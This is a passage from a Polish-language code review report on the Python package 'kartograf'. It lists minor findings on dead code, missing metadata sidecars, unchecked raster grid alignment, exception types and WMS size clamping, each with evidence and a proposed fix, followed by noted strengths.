- Weryfikacja: uruchomiony pytest (ostrzezenia pochodza wylacznie z `test_calculate_hsg_nodata_handling`) oraz snippet `nodata_check.py` z `warnings.catch_warnings(record=True)` — trzy ostrzezenia, wynik dla piksela all-zero poprawny (`HSG = 0`).
- Proponowana naprawa: `clay_n = np.divide(clay, total, out=np.zeros_like(clay), where=valid) * 100` (analogicznie dla sand/silt) — usuwa ostrzezenie bez zmiany wyniku. Uwaga: to kosmetyka; **realny** problem nodata opisuje A4-5.
- Pewnosc: wysoka

### A4-16 [Minor] Martwy kod: nieuzywane pole `_storage`, nieuzywane helpery Keychain, nieosiagalna galaz klasyfikatora
- Plik: `kartograf/landcover/manager.py`:85; `kartograf/providers/corine.py`:132-193 i 196-226; `kartograf/hydrology/hsg.py`:140-142
- Twierdzenie: trzy fragmenty wygladaja na aktywne, a nie sa.
- Dowod:
  ```
  manager.py:85:  self._storage = FileStorage(output_dir)   # grep "_storage" -> jedyne trafienie w pliku
  hsg.py:140-141:  if clay >= 40 and silt >= 40:  return "silty_clay"   # nieosiagalne: blok z linii 128 (clay >= 40) juz zwrocil
  ```
  `save_credentials_to_keychain` i `get_clms_credentials` nie maja w repo zadnego wywolania (`grep -rn ... --include=*.py`); `get_credentials_from_keychain` jest wolane tylko z `get_clms_credentials`, czyli caly ten lancuch jest nieaktywny (patrz A4-1).
- Weryfikacja: grep (wyniki powyzej) + snippet przechodzacy caly symplex: liczba punktow docierajacych do `hsg.py:141` = 0 (wszystkie `clay >= 40` konczy blok 128-134).
- Proponowana naprawa: usunac `self._storage` (albo zaczac go uzywac zamiast recznego skladania sciezek w `_generate_output_path`); usunac nieosiagalne linie 140-142 w `hsg.py`; helpery Keychain albo podlaczyc (A4-1), albo usunac.
- Pewnosc: wysoka

### A4-17 [Minor] `keep_intermediate=True` zostawia pliki bez sidecarow; raster HSG tez go nie ma
- Plik: `kartograf/hydrology/hsg.py`:443-470 (pobranie przez provider z pominieciem managera) i 522-530 (kopiowanie)
- Twierdzenie: CLAUDE.md deklaruje "Kazde udane pobranie tworzy sidecar `<plik>.meta.json`", ale `HSGCalculator` wola `provider.download_by_bbox` bezposrednio (z pominieciem `LandCoverManager`, ktory jako jedyny pisze sidecary), wiec skopiowane do katalogu wyjsciowego `clay.tif`/`sand.tif`/`silt.tif` trafiaja tam bez metadanych; sam raster HSG rowniez nie dostaje sidecara.
- Dowod:
  ```
  hsg.py:443-450:  self.provider.download_by_bbox(bbox, clay_path, timeout=timeout, property="clay", ...)
  hsg.py:526-529:  shutil.copy(clay_path, out_dir / "clay.tif")   # brak write_sidecar
  ```
- Weryfikacja: grep — `write_sidecar`/`build_metadata` nie wystepuja w `kartograf/hydrology/`; sidecary pisze wylacznie `LandCoverManager._write_sidecar` (manager.py:419-450) i `DownloadManager`.
- Proponowana naprawa: w `calculate_hsg_by_bbox` przy `keep_intermediate` dopisac sidecary dla trzech plikow (deskryptor `global.isric.soilgrids` jest juz w rejestrze), a dla samego rastra HSG rozwazyc wlasny wpis `product="hsg"` albo jawnie odnotowac w SCOPE, ze produkty pochodne sidecara nie maja.
- Pewnosc: wysoka

### A4-18 [Minor] Brak sprawdzenia zgodnosci siatek clay/sand/silt przed operacjami elementwise
- Plik: `kartograf/hydrology/hsg.py`:475-492
- Twierdzenie: trzy niezalezne odpowiedzi WCS sa laczone elementwise bez weryfikacji, czy maja ten sam ksztalt i ten sam `transform`; rozjazd ksztaltu da `ValueError` w srodku obliczen, a rozjazd samego `transform` przy zgodnym ksztalcie da cicho przesuniete geograficznie wyniki.
- Dowod:
  ```
  hsg.py:475-483:  clay = clay_src.read(1)...; sand = sand_src.read(1)...; silt = silt_src.read(1)...
  hsg.py:486-492:  clay_pct = clay / CF ...; texture = classify_usda_texture_array(clay_pct, sand_pct, silt_pct)
  ```
  (profil brany wylacznie z `clay_src`, linia 477 — pozostale dwa sa milczaco zakladane jako identyczne)
- Weryfikacja: czytanie kodu; nie odtwarzano (wymagaloby odpowiedzi serwera SoilGrids).
- Proponowana naprawa: po otwarciu trzech rastrow dodac `if not (clay_src.shape == sand_src.shape == silt_src.shape and clay_src.transform == sand_src.transform == silt_src.transform): raise ValidationError(...)`.
- Pewnosc: srednia

### A4-19 [Minor] `ValueError` zamiast `ValidationError` w walidacji parametrow pobierania
- Plik: `kartograf/providers/soilgrids.py`:210-233; `kartograf/providers/corine.py`:515-524
- Twierdzenie: bledny CRS bboxa, nieznana wlasciwosc/glebokosc/statystyka i nieznany rocznik podnosza goly `ValueError`, podczas gdy projekt ma do tego `kartograf.exceptions.ValidationError` (uzywany np. w `download_by_teryt`, soilgrids.py:415) — CLI lapie `ValidationError` osobno, wiec komunikaty ida rozna sciezka.
- Dowod:
  ```
  soilgrids.py:211-215:  if bbox.crs != "EPSG:2180": raise ValueError(...)
  soilgrids.py:414-415:  if not self.validate_teryt(teryt): raise ValidationError(...)   # w tym samym pliku
  ```
- Weryfikacja: grep + czytanie `cli/landcover_cmd.py` (osobne `except` dla `ValidationError` i `DownloadError`).
- Proponowana naprawa: ujednolicic na `ValidationError` (dziedziczy z `KartografError`), zaktualizowac docstringi sekcji "Raises" i testy oczekujace `ValueError`.
- Pewnosc: wysoka

### A4-20 [Minor] CORINE WMS: przyciecie `WIDTH`/`HEIGHT` do 4096 bez korekty bboxa
- Plik: `kartograf/providers/corine.py`:550-557
- Twierdzenie: gdy zamowiony obszar przekracza 409,6 km w jednej osi, kod ogranicza tylko liczbe pikseli, zostawiajac `BBOX` bez zmian — rozdzielczosc przestaje wynosic deklarowane `WMS_RESOLUTION = 100` m/px, a przy przycieciu tylko jednej osi obraz dodatkowo zmienia proporcje.
- Dowod:
  ```
  corine.py:551-555:  max_size = 4096
                      if width_px > max_size: width_px = max_size
                      if height_px > max_size: height_px = max_size
  ```
  (`bbox` nie jest przy tym dzielony ani przycinany)
- Weryfikacja: czytanie kodu; scenariusz brzegowy — dla arkuszy 1:100000 (`width_px = 179`) nieosiagalny, wystepuje dopiero przy bardzo duzych `--bbox`/`--geometry`.
- Proponowana naprawa: przy przekroczeniu limitu albo kafelkowac zapytanie i scalac (jest juz `transport/mosaic.py`), albo jawnie zalogowac `warning` o obnizonej rozdzielczosci i zapisac faktyczna rozdzielczosc w `extra` sidecara.
- Pewnosc: wysoka

## Pozytywy
- Fallback CORINE **nie udaje** GeoTIFF-a: `_download_via_wms` zapisuje jako `.png` (corine.py:565), a `LandCoverManager._write_sidecar` (manager.py:437-447) nadpisuje `horizontal_crs` na faktyczny CRS uzytej uslugi WMS (3857 / 4326 dla 1990) i dopisuje `extra = {"fallback": "wms_png", "uwaga": "podglad WMS, nie dane"}` — kontrakt sidecara jest tu utrzymany precyzyjnie.
- `LandCoverManager` pisze sidecar na **kazdej** sciezce sukcesu: `download()` (wszystkie trzy galezie: 199, 203, 214) oraz `download_by_teryt`/`download_by_bbox`/`download_by_godlo` (243, 277, 313) — nie znalazlem sciezki zwracajacej `Path` bez sidecara.
- `_save_response` w CORINE i SoilGrids (corine.py:1107-1126, soilgrids.py:608-627) pisze atomowo przez `<plik>.<pid>_<tid>.tmp` + `rename` i kasuje temp w `except` — brak plikow czesciowych; nazwa temp jest bezpieczna watkowo.
- `_download_with_retry` sprawdza `Content-Type` i traktuje odpowiedz `xml`/`html` jako blad uslugi (corine.py:1080-1084, soilgrids.py:581-585) — chroni przed zapisaniem ServiceException jako rastra.
- `download_batch` (manager.py:359-396) izoluje bledy pojedynczych pozycji i loguje je, nie przerywajac wsadu; wyjatek z `future.result()` jest osobno obsluzony — obsluga bledow jest tu swiadoma, a nie polykajaca.

## Podsumowanie liczbowe: C=7 I=7 M=6
